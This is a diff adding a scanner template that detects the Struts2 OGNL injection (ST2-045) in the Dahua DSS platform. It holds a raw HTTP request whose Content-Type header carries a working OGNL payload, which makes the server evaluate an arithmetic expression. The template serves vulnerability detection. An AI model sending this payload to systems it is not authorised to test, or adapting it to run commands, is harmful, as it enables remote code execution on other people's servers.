@@ -1,0 +1,32 @@
+id: dahua-dss-login-init-action-rce
+info:
+  name: Dahua DSS Integrated Management Platform RCE (ST2-045)
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: rce
+  description: |
+    Vulnerability in Dahua DSS Integrated Management Platform allowing remote code execution via the login_init.action endpoint using OGNL injection.
+
+variables:
+  t1: "{{rand_int(1000, 10000)}}"
+  t2: "{{rand_int(1000, 10000)}}"
+
+http:
+  - payloads:
+      paths:
+        - "admin/login_login.action"
+        - "portal/login_init.action"
+    raw:
+      - |
+        POST /{{paths}} HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: %{(#n='multipart/form-data').(#d=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#_memberAccess?(#_memberAccess=#d):((#context.setMemberAccess(#d)))).(#o=@org.apache.struts2.ServletActionContext@getResponse().getWriter()).(#o.println({{t1}}*{{t2}})).(#o.close())}
+
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - contains(body, {{to_number(t1) * to_number(t2)}})
